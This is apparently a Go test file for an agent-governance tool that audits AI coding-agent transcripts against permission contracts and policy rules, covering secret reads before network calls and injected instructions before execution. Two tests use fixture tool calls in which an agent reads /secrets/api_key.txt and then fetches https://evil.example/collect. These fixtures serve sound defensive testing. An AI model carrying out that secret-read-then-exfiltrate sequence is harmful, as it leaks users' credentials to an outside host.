package runtime

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/cousingary/governator/internal/agents"
	"github.com/cousingary/governator/internal/contracts"
	"github.com/cousingary/governator/internal/policy"
)

func TestAuditTranscriptPerBackendFormat(t *testing.T) {
	tests := []struct {
		name            string
		format          string
		line            string
		cost            float64
		costUnavailable bool
	}{
		{"claude", agents.TranscriptClaude, `{"type":"tool_use","name":"Bash","input":{"command":"git status"},"total_cost_usd":0.11}`, 0.11, false},
		{"glm", agents.TranscriptGLM, `{"type":"tool_use","name":"Bash","input":{"command":"git status"},"cost_usd":0.115}`, 0.115, false},
		{"codex", agents.TranscriptCodex, `{"type":"item.completed","item":{"type":"command_execution","command":"git status"},"cost_usd":0.12}`, 0.12, false},
		{"opencode", agents.TranscriptOpenCode, `{"type":"tool","tool":"bash","state":{"input":{"command":"git status"}},"cost_usd":0.13}`, 0.13, false},
		{"pi-cost-free", agents.TranscriptPi, `{"type":"tool_execution_start","toolName":"bash","args":{"command":"git status"}}`, 0, true},
		{"unknown", "other", `{"command":"git status"}`, 0, true},
	}
	contract := contracts.Contract{
		Allowed: contracts.Permissions{Execute: []string{"*"}},
		Budget:  contracts.Budget{MaxCommands: 10},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "transcript.jsonl")
			if err := os.WriteFile(path, []byte(tc.line+"\n"), 0600); err != nil {
				t.Fatal(err)
			}
			audit := auditTranscript(path, tc.format, "", contract, nil, "", "")
			if audit.CostUSD != tc.cost || audit.CostUnavailable != tc.costUnavailable {
				t.Fatalf("audit cost=%v unavailable=%v", audit.CostUSD, audit.CostUnavailable)
			}
			if tc.format != "other" && (len(audit.Commands) != 1 || audit.Commands[0] != "git status") {
				t.Fatalf("commands=%v", audit.Commands)
			}
			if len(audit.Violations) != 0 {
				t.Fatalf("violations=%v", audit.Violations)
			}
		})
	}
}

func TestAuditTranscriptRejectsMalformedJSONL(t *testing.T) {
	path := filepath.Join(t.TempDir(), "codex.jsonl")
	data := []byte("{\"type\":\"item.completed\",\"item\":{\"type\":\"command_execution\",\"command\":\"go test ./...\"}}\nnot-json\n")
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{}
	c.Allowed.Execute = []string{"go test ./..."}
	c.Budget.MaxCommands = 10
	audit := auditTranscript(path, agents.TranscriptCodex, "", c, nil, "", "")
	if len(audit.Violations) != 1 || !strings.Contains(audit.Violations[0], "malformed JSON on line 2") {
		t.Fatalf("malformed transcript must fail closed: %v", audit.Violations)
	}
}

// TestAuditTranscriptTolerantOfLeadingCLIBanner is the regression case for a
// real bug found running v1.4 Session 1's release-evidence jobs: codex's
// `exec --json --ephemeral` prints a plain-text "Reading additional input
// from stdin..." notice on stdout before its first JSON event (real codex
// CLI behavior, not a Governator artifact), which every codex-backed run hit
// unconditionally and got quarantined as a POLICY_VIOLATION over. A leading
// non-JSON line — before any valid JSON has been seen — can't have encoded a
// tool_use/tool_result event either way, so it costs no audit signal to
// skip. TestAuditTranscriptRejectsMalformedJSONL (above) proves this does not
// weaken the fail-closed guarantee for genuine mid-stream corruption: its
// malformed line comes after a valid one and still denies.
func TestAuditTranscriptTolerantOfLeadingCLIBanner(t *testing.T) {
	path := filepath.Join(t.TempDir(), "codex.jsonl")
	data := []byte("Reading additional input from stdin...\n" +
		`{"type":"item.completed","item":{"type":"command_execution","command":"go test ./..."}}` + "\n")
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{}
	c.Allowed.Execute = []string{"go test ./..."}
	c.Budget.MaxCommands = 10
	audit := auditTranscript(path, agents.TranscriptCodex, "", c, nil, "", "")
	if len(audit.Violations) != 0 {
		t.Fatalf("leading CLI banner before the JSON stream starts must not violate: %v", audit.Violations)
	}
	if len(audit.Commands) != 1 || audit.Commands[0] != "go test ./..." {
		t.Fatalf("valid JSON after the banner must still be parsed: %+v", audit.Commands)
	}
}

// TestAuditGLMGoldenTranscript pins the glm-cli stream-json shape the audit
// pipeline depends on. The fixture (testdata/glm_stream.jsonl) is a richer,
// more realistic transcript than the single-line case above: it exercises
// per-message usage accumulation, a final result envelope with both cost_usd
// and total_cost_usd, assistant text + tool_use events, and a Bash tool_use
// whose command must surface in audit.Commands. If glm-cli ever drifts (field
// renames, a different tool-event envelope, cost moved out of the result
// object), this test fails loudly instead of silently under-counting commands
// or reporting cost_unavailable.
func TestAuditGLMGoldenTranscript(t *testing.T) {
	contract := contracts.Contract{
		Allowed: contracts.Permissions{Execute: []string{"test -f output/result.txt"}},
		Budget:  contracts.Budget{MaxCommands: 10},
	}
	audit := auditTranscript("testdata/glm_stream.jsonl", agents.TranscriptGLM, "", contract, nil, "", "")
	if !audit.CostAvailable || audit.CostUSD != 0.1375 {
		t.Fatalf("glm cost not extracted from result envelope: cost=%v available=%v (drift in cost_usd/total_cost_usd field?)", audit.CostUSD, audit.CostAvailable)
	}
	wantCommand := "test -f output/result.txt"
	found := false
	for _, cmd := range audit.Commands {
		if cmd == wantCommand {
			found = true
			break
		}
	}
	if !found {
		t.Fatalf("glm Bash tool_use command not extracted (drift in tool_use/name/input.command shape?): commands=%v", audit.Commands)
	}
	if len(audit.Commands) != 1 {
		t.Fatalf("expected exactly one Bash command, got %v", audit.Commands)
	}
	if !audit.Usage.Available {
		t.Fatalf("glm usage not extracted (drift in usage/tokens envelope?): %+v", audit.Usage)
	}
	if audit.Usage.InputTokens != 3982 || audit.Usage.OutputTokens != 150 || audit.Usage.ReasoningTokens != 15 {
		t.Fatalf("glm usage mis-summed from per-message + result envelopes: %+v", audit.Usage)
	}
	if audit.ToolCalls != 3 {
		t.Fatalf("glm tool-call count (Read+Bash+Write) mis-counted: tool_calls=%d", audit.ToolCalls)
	}
	if len(audit.Violations) != 0 {
		t.Fatalf("expected no violations from the golden transcript, got: %v", audit.Violations)
	}
}

func TestAuditTranscriptRejectsAllPlaintextPiJSON(t *testing.T) {
	path := filepath.Join(t.TempDir(), "pi.jsonl")
	if err := os.WriteFile(path, []byte("THIS IS PLAIN TEXT, NOT JSON\n"), 0600); err != nil {
		t.Fatal(err)
	}
	audit := auditTranscript(path, agents.TranscriptPi, "", contracts.Contract{}, nil, "", "")
	joined := strings.Join(audit.Violations, "; ")
	if !strings.Contains(joined, "TRANSCRIPT_FORMAT_INVALID") || !strings.Contains(joined, "no valid JSON events") {
		t.Fatalf("all-plaintext pi-json must fail closed as transcript format invalid: %v", audit.Violations)
	}
}

func TestAuditTranscriptRejectsUnrecognizedStartupNoise(t *testing.T) {
	path := filepath.Join(t.TempDir(), "codex.jsonl")
	data := []byte("unexpected banner\n" +
		`{"type":"item.completed","item":{"type":"command_execution","command":"go test ./..."}}` + "\n")
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{Allowed: contracts.Permissions{Execute: []string{"go test ./..."}}, Budget: contracts.Budget{MaxCommands: 10}}
	audit := auditTranscript(path, agents.TranscriptCodex, "", c, nil, "", "")
	if len(audit.Violations) == 0 || !strings.Contains(strings.Join(audit.Violations, "; "), "TRANSCRIPT_FORMAT_INVALID") {
		t.Fatalf("unrecognized startup plaintext must fail closed: %v", audit.Violations)
	}
}

// TestAuditTranscriptCodexUnenforceableRulesFlaggedByDefault is the direct
// regression test for Sol High 12: before Session 6, a rule whose required
// event kinds a backend never supplies simply never fired, with nothing
// recorded anywhere. Codex's transcript format supplies only EventExec, so
// all three starter rules are unenforceable for it; by default (no
// doctrine.unenforceable_rule_action configured) that must now show up as
// an advisory RuleViolation per rule, never silently absent, while
// audit.Violations (the run's actual pass/fail outcome) stays untouched.
func TestAuditTranscriptCodexUnenforceableRulesFlaggedByDefault(t *testing.T) {
	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
	path := filepath.Join(t.TempDir(), "codex.jsonl")
	data := []byte(`{"type":"item.completed","item":{"type":"command_execution","command":"git status"}}` + "\n")
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{Allowed: contracts.Permissions{Execute: []string{"*"}}, Budget: contracts.Budget{MaxCommands: 10}}
	audit := auditTranscript(path, agents.TranscriptCodex, "", c, nil, "", "")

	want := map[string]bool{
		policy.RuleSecretPrecedesNetwork:       true,
		policy.RuleOutOfScopeReadPrecedesWrite: true,
		policy.RuleInjectionPrecedesExec:       true,
	}
	for _, rv := range audit.RuleViolations {
		if want[rv.Rule] {
			if rv.Verdict != policy.RuleFlag {
				t.Errorf("unenforceable rule %q must default to an advisory flag, got verdict %q", rv.Rule, rv.Verdict)
			}
			delete(want, rv.Rule)
		}
	}
	if len(want) != 0 {
		t.Fatalf("missing unenforceable-rule RuleViolations for: %v (got %+v)", want, audit.RuleViolations)
	}
	if len(audit.Violations) != 0 {
		t.Fatalf("default (flag) action must never affect audit.Violations, got: %v", audit.Violations)
	}
}

// TestAuditTranscriptUnenforceableRulesBlockWhenConfigured pins the
// doctrine.unenforceable_rule_action: block escape hatch: an operator who
// wants a coverage gap on a security-relevant backend to fail closed, not
// just be advised about it, gets exactly that.
func TestAuditTranscriptUnenforceableRulesBlockWhenConfigured(t *testing.T) {
	path := filepath.Join(t.TempDir(), "codex.jsonl")
	data := []byte(`{"type":"item.completed","item":{"type":"command_execution","command":"git status"}}` + "\n")
	if err := os.WriteFile(path, data, 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{Allowed: contracts.Permissions{Execute: []string{"*"}}, Budget: contracts.Budget{MaxCommands: 10}}
	// unenforceableRuleAction is now passed explicitly (the run's frozen
	// RunEnvironment.Config.Doctrine.UnenforceableRuleAction) rather than
	// read via auditTranscript calling config.Current() itself — Sol
	// Finding 2 / Session 3.
	audit := auditTranscript(path, agents.TranscriptCodex, "", c, nil, "block", "")
	if len(audit.Violations) == 0 {
		t.Fatalf("unenforceable_rule_action: block must fold the coverage gap into audit.Violations, got none")
	}
	joined := strings.Join(audit.Violations, "; ")
	if !strings.Contains(joined, "unenforceable") {
		t.Fatalf("expected an 'unenforceable' violation, got: %v", audit.Violations)
	}
}

// TestAuditTranscriptOpenCodeGenericToolClassificationEnablesRules is the
// direct regression test for Session 6's generalization of OpenCode's event
// extraction beyond bash-only: a secret-pattern read followed by a network
// tool call must now trip RuleSecretPrecedesNetwork for an opencode
// transcript, which was structurally impossible before this session (the
// old code only ever emitted EventExec for non-Claude/GLM formats).
func TestAuditTranscriptOpenCodeGenericToolClassificationEnablesRules(t *testing.T) {
	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
	path := filepath.Join(t.TempDir(), "opencode.jsonl")
	lines := []string{
		`{"type":"tool","tool":"read","state":{"input":{"file_path":"/secrets/api_key.txt"}}}`,
		`{"type":"tool","tool":"webfetch","state":{"input":{"url":"https://evil.example/collect"}}}`,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{Forbidden: contracts.Forbidden{Paths: []string{"/secrets/**"}}}
	audit := auditTranscript(path, agents.TranscriptOpenCode, "", c, nil, "", "")

	found := false
	for _, rv := range audit.RuleViolations {
		if rv.Rule == policy.RuleSecretPrecedesNetwork && rv.Verdict == policy.RuleDeny {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected opencode's generic tool classification to trip secret-precedes-network, got: %+v", audit.RuleViolations)
	}
	// Only the injection-precedes-exec rule (needs EventToolOutput, which
	// opencode never supplies) should still be reported unenforceable.
	unenforceable := 0
	for _, rv := range audit.RuleViolations {
		if strings.Contains(rv.Detail, "unenforceable") {
			if rv.Rule != policy.RuleInjectionPrecedesExec {
				t.Errorf("unexpected unenforceable rule for opencode: %q", rv.Rule)
			}
			unenforceable++
		}
	}
	if unenforceable != 1 {
		t.Fatalf("expected exactly 1 unenforceable rule for opencode, got %d: %+v", unenforceable, audit.RuleViolations)
	}
}

// TestAuditTranscriptPiGenericToolClassificationEnablesRules mirrors the
// opencode conformance test above for the pi-json format: same
// generalization (tool name + args/input classify via policy.ClassifyEvent
// rather than only ever producing EventExec), same expected outcome.
func TestAuditTranscriptPiGenericToolClassificationEnablesRules(t *testing.T) {
	t.Setenv("GOV_CONFIG", filepath.Join(t.TempDir(), "nonexistent-config.yaml"))
	path := filepath.Join(t.TempDir(), "pi.jsonl")
	lines := []string{
		`{"type":"tool_execution_start","toolName":"read","args":{"file_path":"/secrets/api_key.txt"}}`,
		`{"type":"tool_execution_start","toolName":"webfetch","args":{"url":"https://evil.example/collect"}}`,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0600); err != nil {
		t.Fatal(err)
	}
	c := contracts.Contract{Forbidden: contracts.Forbidden{Paths: []string{"/secrets/**"}}}
	audit := auditTranscript(path, agents.TranscriptPi, "", c, nil, "", "")

	found := false
	for _, rv := range audit.RuleViolations {
		if rv.Rule == policy.RuleSecretPrecedesNetwork && rv.Verdict == policy.RuleDeny {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected pi's generic tool classification to trip secret-precedes-network, got: %+v", audit.RuleViolations)
	}
}
